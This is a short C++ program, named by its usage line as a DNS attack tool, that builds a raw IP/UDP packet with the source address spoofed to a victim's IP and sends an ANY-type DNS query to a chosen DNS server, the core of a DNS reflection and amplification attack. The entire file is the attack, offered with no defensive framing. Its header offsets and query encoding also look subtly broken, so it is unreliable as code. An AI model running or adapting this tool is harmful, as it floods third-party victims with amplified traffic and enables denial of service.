#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define DATA_SIZE 200
#define TARGET_PORT 7
#define DNS_PORT 53
const unsigned char DNS_Q[] = "3www6google3com0";
const unsigned DNS_Q_Len = sizeof(DNS_Q);

struct dns_t
{
	unsigned short id;
	unsigned QR : 1;
	unsigned OP : 4;
	unsigned flag : 4;
	unsigned res : 3;
	unsigned R : 4;
	unsigned short que_count, ans_count, ser_count, add_count;
};
void error_msg(const char *msg) {printf("Error : %s\n", msg); exit(-1);}
int main(int argc, char **argv)
{
	if(argc != 3) error_msg("Usage : sudo ./dns_attack <victim ip> <dns ip>\n");

	char data[DATA_SIZE], *query = data + 40; // Size of IP + UDP + DNS header = 40 bytes
	struct ip *IP = (struct ip *) data;
	struct udphdr *UDP = (struct udphdr *)(data); // IP header has 20 bytes
	struct dns_t *DNS = (struct dns_t *) (data + 8); // UDP header has 8 bytes
	std::memset(data, 0, DATA_SIZE);

	IP->ip_v = 4;
	IP->ip_hl = 5;
	IP->ip_tos = 0;
	IP->ip_len = 44 + DNS_Q_Len;
	IP->ip_id = 618;
	IP->ip_off = 0;
	IP->ip_ttl = 255;
	IP->ip_p = 17;
	IP->ip_src.s_addr = inet_addr(argv[1]);
	IP->ip_dst.s_addr = inet_addr(argv[2]);

	UDP->source = TARGET_PORT;
	UDP->dest = DNS_PORT;
	UDP->len = 24 + DNS_Q_Len;
	//UDP->check = 0xFFFF;


	DNS->id = 0x0618;
	DNS->QR = 0;
	DNS->OP = 0;
	DNS->flag = 4;//4b'0010
	DNS->res = 0;
	DNS->R = 0;
	DNS->que_count = DNS->add_count = 1;
	DNS->ans_count = DNS->ser_count = 0;

	for(int i = 0 ; i < 20 ; i += 2) data[i] ^= data[i+1] ^= data[i] ^= data[i+1];

	memcpy(query, DNS_Q, DNS_Q_Len);
	query += DNS_Q_Len;
	*(short *)query = 0x00FF;
	query += 2;
	*(short *) query = 1;


	struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = DNS_PORT;
	sin.sin_addr.s_addr = inet_addr(argv[2]);

	int socket_fd;
	socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP); //create socket
	if(socket_fd == -1) error_msg("socket failed.");
	sendto(socket_fd, data, 44 + DNS_Q_Len, 0, (struct sockaddr *)&sin, sizeof(sin));


	return 0;
}